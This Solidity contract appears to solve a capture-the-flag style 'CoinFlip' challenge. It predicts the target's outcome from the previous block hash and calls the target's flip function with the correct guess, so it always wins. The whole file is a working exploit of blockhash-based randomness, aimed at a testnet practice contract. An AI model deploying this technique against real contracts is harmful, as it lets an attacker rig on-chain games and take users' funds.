// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {

  uint256 public consecutiveWins;
  uint256 public lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  //for testing purposes, not gas efficient though
  uint256 coinFlip;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(address _coinFlipAddr) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    //bool side knows the answer, so use bool to correctly "flip"
    //call arb goerli instance of CoinFlip here 
    bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

    return isRight;
  }
}